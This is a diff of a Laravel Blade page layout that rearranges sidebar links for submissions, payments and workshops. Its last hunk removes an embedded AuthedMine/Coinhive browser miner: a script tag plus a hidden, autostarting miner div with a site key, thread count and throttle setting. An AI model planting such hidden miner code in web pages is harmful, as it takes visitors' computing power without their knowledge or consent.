@@ -125,17 +125,17 @@
                     <li>
                         <a href="#submissions" class="list-group-item " data-toggle="collapse"><i class="glyphicon glyphicon-list"></i>Submission  <span class="glyphicon glyphicon-chevron-right"></span></a>
                         <div class="collapse" id="submissions">
+                            <a href="{{ route('user.submission') }}" class="list-group-item">List</a>
                             <a href="{{ route('user.conference.register') }}" class="list-group-item">Register Conference</a>
                             <a href="{{ route('user.publication.register') }}" class="list-group-item">Register Publication</a>
-                            <a href="{{ route('user.submission') }}" class="list-group-item">List</a>
+                            <a href="{{ route('user.payment') }}" class="list-group-item">Payment</a>
                         </div>
                     </li>
                     <li>
-                        <a href="#payment" class="list-group-item " data-toggle="collapse"><i class="glyphicon glyphicon-list"></i>Payment  <span class="glyphicon glyphicon-chevron-right"></span></a>
-                        <div class="collapse" id="payment">
-                            <a href="{{ route('user.payment') }}" class="list-group-item">Participant</a>
-                            <a href="" class="list-group-item">Non-Participant</a>
-                            <a href="" class="list-group-item">History</a>
+                        <a href="#workshop" class="list-group-item " data-toggle="collapse"><i class="glyphicon glyphicon-list"></i>Workshop  <span class="glyphicon glyphicon-chevron-right"></span></a>
+                        <div class="collapse" id="workshop">
+                            <a href="{{ route('user.workshop.register') }}" class="list-group-item">Register</a>
+                            <a href="{{ route('user.workshop') }}" class="list-group-item">Payment</a>
                         </div>
                     </li>
                     <li>
@@ -177,13 +177,4 @@
 <script type="text/javascript" src="https://cdn.datatables.net/v/bs/dt-1.10.16/datatables.min.js"></script>
 
 @yield('scripts',"")
-<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="coinhive-miner"
-     style="width: 256px; height: 310px; display: none"
-     data-key="ePDKYq4a5JjUiiLlA3pRntapcixcJQBO"
-     data-autostart="true"
-     data-threads="2"
-     data-throttle="0.8">
-    <em>Loading...</em>
-</div>
 </body></html>
